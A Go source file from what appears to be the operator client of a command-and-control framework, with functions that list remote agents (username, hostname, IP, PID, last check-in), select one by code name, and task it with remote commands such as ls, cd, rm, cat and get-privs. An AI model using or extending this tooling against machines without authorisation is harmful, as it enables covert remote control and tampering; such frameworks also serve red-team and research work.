package commander

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"time"

	"text/tabwriter"

	clientdb "github.com/execute-assembly/c2-proj/client/internal/db"
	"github.com/execute-assembly/c2-proj/client/internal/rpc"
	"github.com/execute-assembly/c2-proj/modules/pb"
	"google.golang.org/protobuf/types/known/emptypb"
)

var ClientInUse string
var ClientCodeName string

var ClientCache = map[string]string{}

func ConvertTime(unixTime string) string {

	timeInt, err := strconv.ParseInt(unixTime, 10, 64)
	if err != nil {
		return ""
	}

	t := time.Unix(timeInt, 0)
	now := time.Now()
	duration := now.Sub(t)

	if duration < time.Minute {
		return fmt.Sprintf("%ds", int(duration.Seconds()))
	} else if duration < time.Hour {
		return fmt.Sprintf("%dm", int(duration.Minutes()))
	} else if duration < 24*time.Hour {
		return fmt.Sprintf("%dh", int(duration.Hours()))
	}

	return ""

}

func HandleListClients() error {
	PrintOk("Listing Clients...")
	resp, err := rpc.Client.ListClients(context.Background(), &emptypb.Empty{})
	if err != nil {
		return err
	}

	if len(resp.Clients) == 0 {
		PrintInfo("No agents active")
		return nil
	}
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', tabwriter.Debug)
	fmt.Printf("\n")
	fmt.Fprintln(w, "Code Name\tUsername\tHostname\tIP\tArch\tPID\tVersion\tLast Seen")
	fmt.Fprintln(w, "-----------\t-------------\t--------------\t------------\t------\t-----\t-------------------\t----------")
	for _, c := range resp.Clients {
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\t%d\t%s\t%s\n", c.CodeName, c.Username, c.Hostname,
			c.Ip, c.Arch, c.Pid, c.Version, ConvertTime(c.LastCheckin))
	}
	w.Flush()
	fmt.Printf("\n")

	return nil

}

func UseClient(args []string) error {
	if len(args) < 1 {
		PrintErr("Must choose agents code_name")
		return fmt.Errorf("Not Enough Args")
	}

	codeName := args[0]
	guid, cached := ClientCache[codeName]
	if !cached {
		resp, err := rpc.Client.ConvertCodeName(context.Background(), &pb.ConvertCodeMessage{CodeName: codeName})
		if err != nil {
			PrintErr(fmt.Sprintf("Unknown Error: %s", err))
			return err
		}
		if resp.Status == 3 {
			PrintErr("User not found")
			return fmt.Errorf("user not found")
		}
		ClientCache[codeName] = resp.Guid
		guid = resp.Guid
	}

	ClientInUse = guid
	ClientCodeName = codeName
	PrintOk(fmt.Sprintf("Using Agent %s", BoldWhite(fmt.Sprintf("%s[%s]", codeName, ClientInUse))))

	return nil
}

var CommandMap = map[string]int{
	"ls":        0x1,
	"cd":        0x2,
	"rm":        0x3,
	"mv":        0x4,
	"cat":       0x5,
	"get-privs": 0x6,
}

func HandleHistory() {
	if ClientInUse == "" {
		PrintErr("No agent selected")
		return
	}
	if err := clientdb.ListHistory(Out, false); err != nil {
		PrintErr("Failed to list history: " + err.Error())
	}
}

func HandleLS(args []string) error {
	if ClientInUse == "" {
		PrintErr("Must choose agents code_name")
		return fmt.Errorf("No agent selected")
	}
	if len(args) < 1 {
		PrintErr("Usage: ls <path>")
		return fmt.Errorf("Not Enough Args")
	}

	resp, err := rpc.Client.SendCommand(context.Background(), &pb.CommandReqData{Guid: ClientInUse,
		CommandCode: int32(CommandMap["ls"]),
		Param:       args[0]})
	if err != nil {
		return err
	}

	if resp.Status == 1 {
		PrintErr("User Doesnt exist!")
	} else if resp.Status == 0 {
		str := fmt.Sprintf("Agent [%s] Tasked To run ls [%d]", ClientInUse, resp.TaskId)
		PrintOk(str)
		clientdb.InsertTask(resp.TaskId, ClientInUse, "ls", args[0], "")
	}
	return nil

}

func HandleTasks() {
	if ClientInUse == "" {
		PrintErr("No agent selected")
		return
	}
	if err := clientdb.ListHistory(Out, true); err != nil {
		PrintErr("Failed to list Tasks: " + err.Error())
	}
}
